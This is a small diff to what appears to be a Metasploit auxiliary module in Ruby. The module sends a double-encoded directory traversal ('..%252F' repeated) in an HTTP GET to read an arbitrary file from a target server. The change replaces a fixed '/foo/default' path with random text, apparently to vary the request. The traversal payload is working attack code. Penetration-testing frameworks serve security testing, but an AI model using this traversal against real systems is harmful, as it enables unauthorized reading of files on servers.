@@ -39,13 +39,18 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 
+  def data
+    Rex::Text.rand_text_alpha(3..8)
+  end
+
   def run_host(ip)
     filename = datastore['FILEPATH']
     traversal = "#{"..%252F" * datastore['DEPTH']}#{filename}"
+    uri = "/#{data}/#{data}/master/#{traversal}"
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/foo/default/master/#{traversal}"
+      'uri'    => uri
     })
 
     unless res && res.code == 200
